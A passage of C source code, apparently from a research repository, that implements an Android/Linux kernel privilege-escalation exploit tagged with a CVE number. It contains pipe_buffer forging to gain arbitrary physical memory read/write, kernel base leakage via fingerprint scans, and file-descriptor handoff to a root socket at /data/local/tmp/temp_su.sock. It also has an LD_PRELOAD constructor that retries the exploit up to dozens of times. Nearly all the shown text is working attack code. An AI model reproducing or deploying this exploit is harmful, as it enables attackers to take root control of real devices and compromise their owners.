      memcmp(&restored, &saved, sizeof(saved)) == 0;
  int ok = wrote == (ssize_t)len && restored_ok;
  if (!ok) {
    pr_error("pipe write failed wrote=%zd want=%zu restore=%d\n",
             wrote, len, restored_ok);
  }
  return ok;
}

#if !defined(APP_EXACT_PIPE_BUFFER_ONLY) || !APP_EXACT_PIPE_BUFFER_ONLY
void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}
#endif

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  size_t page_off = direct_addr & (PAGE_SIZE - 1);
  if (!out || !len || len >= PAGE_SIZE || !is_direct_ptr(direct_addr) ||
      len > PAGE_SIZE - page_off) {
    return 0;
  }

  if (!pipebuf_addr) {
#if defined(APP_EXACT_PIPE_BUFFER_ONLY) && APP_EXACT_PIPE_BUFFER_ONLY
    return 0;
#else
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
#endif
  }
  int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
  return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  size_t page_off = direct_addr & (PAGE_SIZE - 1);
  if (!data || !len || len >= PAGE_SIZE || !is_direct_ptr(direct_addr) ||
      len > PAGE_SIZE - page_off) {
    return 0;
  }

  if (!pipebuf_addr) {
#if defined(APP_EXACT_PIPE_BUFFER_ONLY) && APP_EXACT_PIPE_BUFFER_ONLY
    return 0;
#else
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
    return wrote == (ssize_t)len;
#endif
  }
  int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
  return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
}

static int pipe_read64_checked(
    int fd, uintptr_t direct_addr, uint64_t *value) {
  return value &&
         pipe_phys_read_data(fd, direct_addr, value, sizeof(*value));
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
  int ok = 0;
  int proof_saved = 0;
  int proof64_saved = 0;
  char saved_proof[sizeof(PHYS_WRITE_TAG)];
  char restored_proof[sizeof(saved_proof)];
  uint64_t saved_proof64 = 0;
  uint64_t restored_proof64 = 0;

  if (pipebuf_page_base == 0) {
    atomic_store(&pipe_prepare_done, 0);
    atomic_store(&pipe_prepare_request, 1);
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
    }
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof64_addr = proof_addr + 0x100;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1)) ||
      sizeof(PHYS_READ_TAG) > PAGE_SIZE - (proof_addr & (PAGE_SIZE - 1)) ||
      sizeof(saved_proof) > PAGE_SIZE - (proof_addr & (PAGE_SIZE - 1)) ||
      sizeof(saved_proof64) >
          PAGE_SIZE - (proof64_addr & (PAGE_SIZE - 1)) ||
      (proof_addr & ~(PAGE_SIZE - 1)) !=
          (proof64_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }
  if (!pipe_reclaim_cache_gate(fd)) {
    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
            candidate_slab_cache, kmalloc_pipe_cache);
    return 0;
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
          found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
          pipe_scan_ops, pipe_scan_len);
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_read_data(fd, proof_addr, saved_proof, sizeof(saved_proof)) !=
      (ssize_t)sizeof(saved_proof)) {
    pr_error("phys proof old read failed addr=%016zx size=%zu\n",
             proof_addr, sizeof(saved_proof));
    goto cleanup;
  }
  proof_saved = 1;
  if (kernel_read_data(fd, proof64_addr, &saved_proof64,
                       sizeof(saved_proof64)) !=
      (ssize_t)sizeof(saved_proof64)) {
    pr_error("phys proof64 old read failed addr=%016zx\n", proof64_addr);
    goto cleanup;
  }
  proof64_saved = 1;
  pr_info("phys proof spans data=%016zx-%016zx qword=%016zx-%016zx\n",
          proof_addr, proof_addr + sizeof(saved_proof) - 1,
          proof64_addr, proof64_addr + sizeof(saved_proof64) - 1);
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    goto cleanup;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  if (kernel_read_data(fd, proof_addr, physrw_after_write,
                       sizeof(overwrite)) != (ssize_t)sizeof(overwrite)) {
    goto cleanup;
  }

  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  if (kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64)) !=
      (ssize_t)sizeof(seed64)) {
    goto cleanup;
  }
  if (!pipe_read64_checked(fd, proof64_addr, &physrw_read64_before)) {
    goto cleanup;
  }
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  if (kernel_read_data(fd, proof64_addr, &physrw_read64_after,
                       sizeof(physrw_read64_after)) !=
      (ssize_t)sizeof(physrw_read64_after)) {
    goto cleanup;
  }
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  ok = physrw_read_ok &&
       memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
       physrw_write_ok &&
       memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
       physrw_read64_ok && physrw_write64_ok;

cleanup:
  if (proof64_saved) {
    int write_ok = kernel_write_data(fd, proof64_addr, &saved_proof64,
                                     sizeof(saved_proof64)) ==
                   (ssize_t)sizeof(saved_proof64);
    int read_ok = kernel_read_data(fd, proof64_addr, &restored_proof64,
                                   sizeof(restored_proof64)) ==
                  (ssize_t)sizeof(restored_proof64);
    int restore_ok = write_ok && read_ok &&
                     restored_proof64 == saved_proof64;
    pr_info("phys proof64 restore=%d old=%016llx now=%016llx\n",
            restore_ok, (unsigned long long)saved_proof64,
            (unsigned long long)restored_proof64);
    ok &= restore_ok;
  }
  if (proof_saved) {
    int write_ok = kernel_write_data(fd, proof_addr, saved_proof,
                                     sizeof(saved_proof)) ==
                   (ssize_t)sizeof(saved_proof);
    int read_ok = kernel_read_data(fd, proof_addr, restored_proof,
                                   sizeof(restored_proof)) ==
                  (ssize_t)sizeof(restored_proof);
    int restore_ok = write_ok && read_ok &&
                     memcmp(restored_proof, saved_proof,
                            sizeof(saved_proof)) == 0;
    pr_info("phys proof restore=%d size=%zu\n",
            restore_ok, sizeof(saved_proof));
    ok &= restore_ok;
  }
  return ok;
}

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int pipe_write_full(int fd, const void *data, size_t size) {
  const unsigned char *cursor = data;
  while (size) {
    ssize_t wrote = write(fd, cursor, size);
    if (wrote <= 0) {
      return 0;
    }
    cursor += wrote;
    size -= (size_t)wrote;
  }
  return 1;
}

static int pipe_read_full(int fd, void *data, size_t size) {
  unsigned char *cursor = data;
  while (size) {
    ssize_t got = read(fd, cursor, size);
    if (got <= 0) {
      return 0;
    }
    cursor += got;
    size -= (size_t)got;
  }
  return 1;
}

static int pipe_duplicate_bytes(
    int source_fd, int holder[2], size_t size, size_t slots) {
  SYSCHK(pipe(holder));
  resize_pipe_slots(holder, slots);
  errno = 0;
  ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
  return duplicated == (ssize_t)size;
}

static int transfer_p0_references_to_root(int retained_pipe_index) {
  int retained_fds[] = {
    pipe_fds_reclaim[retained_pipe_index][0],
    p0_gate_holders[retained_pipe_index][0],
    reclaim_receiver_fd(),
  };
  for (size_t index = 0;
       index < sizeof(retained_fds) / sizeof(retained_fds[0]); index++) {
    if (retained_fds[index] < 0) {
      return 0;
    }
  }

  int socket_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (socket_fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  snprintf(address.sun_path, sizeof(address.sun_path), "%s",
           "/data/local/tmp/temp_su.sock");
  if (connect(socket_fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
    close(socket_fd);
    return 0;
  }

  char allowed = 0;
  char operation = 'H';
  if (!pipe_read_full(socket_fd, &allowed, sizeof(allowed)) || allowed != 'A' ||
      !pipe_write_full(socket_fd, &operation, sizeof(operation))) {
    close(socket_fd);
    return 0;
  }

  char marker = 'P';
  struct iovec iov = {
    .iov_base = &marker,
    .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(retained_fds))];
  struct msghdr message;
  memset(&message, 0, sizeof(message));
  memset(control, 0, sizeof(control));
  message.msg_iov = &iov;
  message.msg_iovlen = 1;
  message.msg_control = control;
  message.msg_controllen = sizeof(control);
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&message);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(retained_fds));
  memcpy(CMSG_DATA(cmsg), retained_fds, sizeof(retained_fds));
  if (sendmsg(socket_fd, &message, 0) != (ssize_t)sizeof(marker)) {
    close(socket_fd);
    return 0;
  }

  char acknowledged = 0;
  int transferred = pipe_read_full(
      socket_fd, &acknowledged, sizeof(acknowledged)) && acknowledged == 'K';
  close(socket_fd);
  return transferred;
}

static void spawn_p0_ref_keeper(int retained_pipe_index) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    pr_info("p0 reference keeper pid=%d pipe=%d\n",
            child, retained_pipe_index);
    return;
  }
  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-p0ref", 0, 0, 0);
  syscall(SYS_setsid);
  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (fd != null_fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  }
  if (retained_pipe_index >= 0) {
    for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
      if ((int)pipe_index != retained_pipe_index) {
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][0]);
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
        syscall(SYS_close, p0_gate_holders[pipe_index][0]);
        syscall(SYS_close, p0_gate_holders[pipe_index][1]);
        continue;
      }
      syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
      syscall(SYS_close, p0_gate_holders[pipe_index][1]);
    }
  }
  if (retained_pipe_index < 0) {
    for (;;) {
      pause();
    }
  }
  for (;;) {
    if (transfer_p0_references_to_root(retained_pipe_index)) {
      _exit(0);
    }
    usleep(10000);
  }
}

int prepare_p0_pipe_oracle(void) {
  _Static_assert(sizeof(struct user_pipe_buffer) == 0x28,
                 "unexpected pipe_buffer size");

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    p0_gate_holders[pipe_index][0] = -1;
    p0_gate_holders[pipe_index][1] = -1;
  }
  p0_gate_holders_initialized = 1;

  pipebuf_page_base = prepare_pipe_buffer_page();
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         sizeof(marker))) {
      return 0;
    }
  }
  pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
          pipebuf_page_base, PIPE_RECLAIM);
  return 1;
}

int expand_p0_pipe_oracle(void) {
  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    for (size_t slot = 1; slot < PIPE_BUFFER_SLOTS; slot++) {
      if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                           sizeof(marker))) {
        return 0;
      }
    }
  }
  pr_info("p0 pipe oracle expanded pipes=%d slots=%d\n",
          PIPE_RECLAIM, PIPE_BUFFER_SLOTS);
  return 1;
}

int verify_p0_pipe_oracle_gate(void) {
  unsigned char page[PAGE_SIZE];
  int gate_hits = 0;
  int gate_pipe_index = -1;
  int changed_pages = 0;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  p0_gate_holders_initialized = 1;
#endif
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
      pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        sizeof(page))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    size_t gate_offset = PAGE_SIZE;
    for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
      if (memcmp(page + offset, "RMG-P0-ORACLE-GATE", 18) == 0) {
        gate_offset = offset;
        break;
      }
    }
    if (gate_offset != PAGE_SIZE) {
      gate_hits++;
      gate_pipe_index = (int)pipe_index;
      pr_info("p0 gate marker pipe=%zu offset=%zu\n",
              pipe_index, gate_offset);
    } else if (memcmp(page, "RMG-P0-PIPE", 11) != 0) {
      changed_pages++;
      uint64_t words[8];
      memcpy(words, page, sizeof(words));
      pr_info("p0 gate changed pipe=%zu q0=%016llx q1=%016llx "
              "q2=%016llx q3=%016llx q4=%016llx q5=%016llx "
              "q6=%016llx q7=%016llx\n",
              pipe_index,
              (unsigned long long)words[0],
              (unsigned long long)words[1],
              (unsigned long long)words[2],
              (unsigned long long)words[3],
              (unsigned long long)words[4],
              (unsigned long long)words[5],
              (unsigned long long)words[6],
              (unsigned long long)words[7]);
    }
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         sizeof(marker))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
  }
  pr_info("p0 pipe gate hits=%d changed=%d\n",
          gate_hits, changed_pages);
  if (gate_hits != 0 || changed_pages != 0) {
    spawn_p0_ref_keeper(
        gate_hits == 1 && changed_pages == 0 ? gate_pipe_index : -1);
  }
  if (gate_hits == 1 && changed_pages == 0) {
    return 1;
  }
  if (gate_hits == 0 && changed_pages == 0) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    close_p0_gate_holders();
#endif
    return 0;
  }
  return -1;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected) {
  unsigned char page[PAGE_SIZE];
  size_t target_offset = target & (PAGE_SIZE - 1);
  int changed_pages = 0;
  int exact_matches = 0;
  uint64_t observed = 0;

  if (target_offset + sizeof(observed) > sizeof(page)) {
    return -1;
  }
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        sizeof(page))) {
      pr_warning("fops data alias read failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      return -1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }
    changed_pages++;
    memcpy(&observed, page + target_offset, sizeof(observed));
    if (observed == expected) {
      exact_matches++;
    }
    pr_info("fops data alias pipe=%zu target=%016zx offset=%zu "
            "observed=%016llx expected=%016llx match=%d\n",
            pipe_index, target, target_offset,
            (unsigned long long)observed,
            (unsigned long long)expected, observed == expected);
  }
  pr_info("fops data alias changed=%d exact=%d target=%016zx "
          "observed=%016llx expected=%016llx\n",
          changed_pages, exact_matches, target,
          (unsigned long long)observed, (unsigned long long)expected);
  if (changed_pages == 1 && exact_matches == 1) {
    return 1;
  }
  return changed_pages == 0 ? 0 : -1;
}
#endif

static int p0_fingerprint_score(
    const unsigned char *page, const struct p0_fingerprint *fingerprint) {
  int score = 0;
  for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
    uint64_t value = 0;
    memcpy(&value, page + p0_fingerprint_offsets[index], sizeof(value));
    if (value == fingerprint->words[index]) {
      score++;
    }
  }
  return score;
}

uintptr_t scan_p0_pipe_oracle(void) {
  unsigned char page[PAGE_SIZE];
  size_t scan_size =
      p0_fingerprint_offsets[P0_FINGERPRINT_WORDS - 1] + sizeof(uint64_t);
  uintptr_t best_slide = (uintptr_t)-1;
  int best_score = -1;
  int second_score = -1;
  int changed_pages = 0;

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    memset(page, 0, sizeof(page));
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        scan_size)) {
      pr_warning("p0 scan partial read failed pipe=%zu size=%zu errno=%d\n",
                 pipe_index, scan_size, errno);
      return (uintptr_t)-1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }

    changed_pages++;
    uint64_t sampled_words[P0_FINGERPRINT_WORDS];
    for (size_t word = 0; word < P0_FINGERPRINT_WORDS; word++) {
      memcpy(&sampled_words[word], page + p0_fingerprint_offsets[word],
             sizeof(sampled_words[word]));
    }
    pr_info("p0 fingerprint sample "
            "w0=%016llx w1=%016llx w2=%016llx w3=%016llx "
            "w4=%016llx w5=%016llx w6=%016llx w7=%016llx\n",
            (unsigned long long)sampled_words[0],
            (unsigned long long)sampled_words[1],
            (unsigned long long)sampled_words[2],
            (unsigned long long)sampled_words[3],
            (unsigned long long)sampled_words[4],
            (unsigned long long)sampled_words[5],
            (unsigned long long)sampled_words[6],
            (unsigned long long)sampled_words[7]);
    for (size_t index = 0;
         index < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
         index++) {
      int score = p0_fingerprint_score(page, &p0_fingerprints[index]);
      if (score > best_score) {
        second_score = best_score;
        best_score = score;
        best_slide = p0_fingerprints[index].slide;
      } else if (score > second_score) {
        second_score = score;
      }
    }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    pr_info("p0 fingerprint pipe=%zu best=%d second=%d "
            "source_offset=%08zx\n",
            pipe_index, best_score, second_score, best_slide);
#else
    pr_info("p0 fingerprint pipe=%zu best=%d second=%d slide=%08zx\n",
            pipe_index, best_score, second_score, best_slide);
#endif
  }

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  pr_info("p0 fingerprint changed=%d best=%d second=%d "
          "source_offset=%08zx\n",
          changed_pages, best_score, second_score, best_slide);
#else
  pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
          changed_pages, best_score, second_score, best_slide);
#endif
  if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
    return (uintptr_t)-1;
  }
  return best_slide;
}

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
uint64_t scan_p0_virtual_base_pointer(void) {
  unsigned char page[PAGE_SIZE];
  size_t pointer_offset = data_addr(ASHMEM_MISC_FOPS) & (PAGE_SIZE - 1);
  size_t read_size = pointer_offset + sizeof(uint64_t);
  uint64_t pointer = 0;
  int changed_pages = 0;

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    memset(page, 0, sizeof(page));
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page, read_size)) {
      pr_warning("p0 virtual probe partial read failed pipe=%zu size=%zu "
                 "errno=%d\n", pipe_index, read_size, errno);
      return 0;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }
    changed_pages++;
    memcpy(&pointer, page + pointer_offset, sizeof(pointer));
    pr_info("p0 virtual probe pipe=%zu offset=%zu pointer=%016llx\n",
            pipe_index, pointer_offset, (unsigned long long)pointer);
  }

  pr_info("p0 virtual probe changed=%d pointer=%016llx\n",
          changed_pages, (unsigned long long)pointer);
  if (changed_pages != 1 || (pointer >> 48) != 0xffff) {
    return 0;
  }
  return pointer;
}
#endif

int restore_p0_oracle_pages(int fd) {
  if (!p0_gate_page_struct && !p0_probe_page_struct) {
    return 1;
  }
  if (!p0_gate_page_struct || !p0_probe_page_struct) {
    return 0;
  }
  uintptr_t pages[] = {
    p0_gate_page_struct,
    p0_probe_page_struct,
  };
  uint64_t zero = 0;
  int restored = 1;

  for (size_t index = 0; index < sizeof(pages) / sizeof(pages[0]); index++) {
    uintptr_t compound_head = pages[index] + STRUCT_PAGE_COMPOUND_HEAD_OFF;
    uint64_t before = 0;
    uint64_t after = UINT64_MAX;
    ssize_t read_before = configfs_read_once(
        fd, compound_head, &before, sizeof(before));
    int write_needed = read_before == (ssize_t)sizeof(before) && before != 0;
    ssize_t write_ret = 0;
    ssize_t read_after = -1;
    if (write_needed) {
      write_ret = configfs_write_once(
          fd, compound_head, &zero, sizeof(zero));
    }
    if (read_before == (ssize_t)sizeof(before) &&
        (!write_needed || write_ret == (ssize_t)sizeof(zero))) {
      read_after = configfs_read_once(
          fd, compound_head, &after, sizeof(after));
    }
    pr_info("p0 restore page=%016zx read=%zd needed=%d write=%zd "
            "verify=%zd before=%016llx after=%016llx\n",
            pages[index], read_before, write_needed, write_ret, read_after,
            (unsigned long long)before, (unsigned long long)after);
    if (read_before != (ssize_t)sizeof(before) ||
        (write_needed && write_ret != (ssize_t)sizeof(zero)) ||
        read_after != (ssize_t)sizeof(after) || after != 0) {
      restored = 0;
    }
  }
  return restored;
}
#endif

```

---

## preload.c

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/preload.c`

```c
#include "common.h"

#ifndef DEFAULT_EXPLOIT_ATTEMPTS
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define DEFAULT_EXPLOIT_ATTEMPTS 24
#else
#define DEFAULT_EXPLOIT_ATTEMPTS 16
#endif
#endif
#define DEFAULT_PSELECT_DELAY_USEC 20000
#ifndef DEFAULT_ATTEMPT_TIMEOUT_SEC
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 300
#endif
#ifndef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 180
#endif
#define APP_MIN_BOOT_UPTIME_SEC 120

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
struct app_p0_shared_state {
  atomic_int dirty;
  atomic_int slide_ready;
  atomic_int p0_ready;
  atomic_int writer_started;
  _Atomic uintptr_t offset;
  _Atomic uintptr_t gate_page_struct;
  _Atomic uintptr_t probe_page_struct;
};

static struct app_p0_shared_state *app_p0_state;

void app_publish_p0_offset(uintptr_t offset) {
  if (!app_p0_state) {
    return;
  }
  atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
  atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
  atomic_store(&app_p0_state->offset, offset);
  atomic_store(&app_p0_state->p0_ready, 1);
  atomic_store(&app_p0_state->slide_ready, 1);
}

void app_publish_slide_ready(void) {
  if (app_p0_state) {
    atomic_store(&app_p0_state->slide_ready, 1);
  }
}

void app_publish_p0_dirty(void) {
  if (!app_p0_state) {
    return;
  }
  atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
  atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
  atomic_store(&app_p0_state->dirty, 1);
}

void app_publish_writer_started(void) {
  if (app_p0_state) {
    atomic_store(&app_p0_state->writer_started, 1);
  }
}

#endif

static int env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

static int attempt_delay_usec(int base_delay, int attempt) {
#if defined(APP_PAYLOAD_ATTEMPT_DELAYS_USEC)
  static const int delays[] = {
    APP_PAYLOAD_ATTEMPT_DELAYS_USEC
  };
  (void)base_delay;
  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  int delay = delays[(attempt - 1) % count];
#else
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  static const int offsets[] = {
    5000, 0, 10000, 30000, -5000, 20000, 15000, 25000,
  };
#else
  static const int offsets[] = {
    0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
  };
#endif
  int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
  int delay = base_delay + offsets[(attempt - 1) % count];
#endif
  return delay < 0 ? 0 : delay;
}

static void wait_for_boot_quiet_window(void) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  struct timespec uptime;
  SYSCHK(clock_gettime(CLOCK_BOOTTIME, &uptime));
  if (uptime.tv_sec < APP_MIN_BOOT_UPTIME_SEC) {
    time_t wait_sec = APP_MIN_BOOT_UPTIME_SEC - uptime.tv_sec;
    pr_info("waiting for boot allocator quiet window seconds=%lld uptime=%lld\n",
            (long long)wait_sec, (long long)uptime.tv_sec);
    while (wait_sec > 0) {
      wait_sec = sleep((unsigned int)wait_sec);
    }
  }
#endif
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  set_unbuffer();
  wait_for_boot_quiet_window();

  int max_attempts = env_int(
      "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
  int base_delay = env_int(
      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
  int attempt_timeout_sec = env_int(
      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
  int p0_attempt_timeout_sec = env_int(
      "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 5,
      attempt_timeout_sec);
  if (p0_attempt_timeout_sec > attempt_timeout_sec) {
    p0_attempt_timeout_sec = attempt_timeout_sec;
  }
  if (getenv("SLIDE_ONLY")) {
    max_attempts = 1;
  }

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
  app_p0_state = mmap(NULL, sizeof(*app_p0_state), PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (app_p0_state == MAP_FAILED) {
    pr_error("app p0 shared state mmap failed errno=%d\n", errno);
    _exit(1);
  }
#endif

  unsetenv("LD_PRELOAD");
  char *argv[] = {"preload.so", NULL};

  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d "
             "p0_timeout=%d timeout=%d\n",
             getpid(), max_attempts, base_delay, p0_attempt_timeout_sec,
             attempt_timeout_sec);

  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    int delay_usec = attempt_delay_usec(base_delay, attempt);
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
      if (getppid() == 1) {
        _exit(1);
      }
      char delay[16];
      char attempt_text[16];
